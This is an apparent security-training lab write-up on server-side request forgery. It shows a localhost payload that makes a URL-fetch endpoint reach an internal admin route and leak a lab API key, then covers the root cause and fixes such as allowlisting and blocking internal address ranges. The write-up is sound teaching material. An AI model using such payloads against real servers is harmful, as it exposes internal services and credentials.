# SSRF Lab — Internal Admin Service Exposure

## Lab Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where attackers abuse a backend URL fetcher to access internal services not intended for public users.

The vulnerable application allows users to submit URLs that the server retrieves on their behalf.

---

## Vulnerability Type

Server-Side Request Forgery (SSRF)

OWASP Category:

A10:2021 — Server-Side Request Forgery (SSRF)

---

## Scenario

Employees use an internal URL preview tool.

Endpoint:

POST

```text
/api/ssrf/fetch
```

Users submit URLs:

Example:

```text
http://example.com
```

The backend fetches resources without restricting destinations.

---

## Normal Usage

Request:

```json
{
"url":
"http://example.com"
}
```

Response:

```text
Resource fetched successfully
```

---

## Enumeration Clues

Developer notes reveal:

```text
Internal admin service runs locally

GET /api/ssrf/internal/admin

Do not expose externally
```

This suggests hidden services exist.

---

## Exploit Payload

Attacker submits:

```text
http://localhost:5000/api/ssrf/internal/admin
```

Request:

POST

```json
{
"url":
"http://localhost:5000/api/ssrf/internal/admin"
}
```

---

## Successful Exploitation

Response:

```json
{
"message":"Internal service",

"apiKey":
"vulnlab_admin_2026",

"note":
"Do not expose externally"
}
```

Lab solved.

Internal API key exposed.

---

## Impact

Attacker gains:

✔ Access to internal services

✔ API key leakage

✔ Sensitive system exposure

Possible consequences:

```text
Cloud metadata theft
Credential exposure
Privilege escalation
Lateral movement
```

---

## Root Cause

Backend trusts user-controlled URLs:

Example:

```text
axios.get(user_input)
```

without validating:

```text
localhost
127.0.0.1
internal IP ranges
metadata endpoints
```

Server fetches unintended destinations.

---

## Secure Fixes

### Allowlist domains

Only permit:

```text
trusted-company.com
approved APIs
```

Reject arbitrary URLs.

---

### Block internal addresses

Reject:

```text
localhost
127.0.0.1
169.254.x.x
10.x.x.x
172.x.x.x
192.168.x.x
```

---

### Network segmentation

Prevent backend services from reaching sensitive internal resources.

---

### URL validation

Validate:

```text
protocol
hostname
IP range
```

before requests.

---

## Learning Objectives

After completing this lab learners should understand:

- SSRF vulnerabilities
- Internal service discovery
- API leakage risks
- URL validation failures
- Secure backend fetching

---

## Lab Information

Lab:

SSRF — Internal Admin Service Exposure

Difficulty:

Medium

Category:

Backend / Network Security

Status:

✔ Completed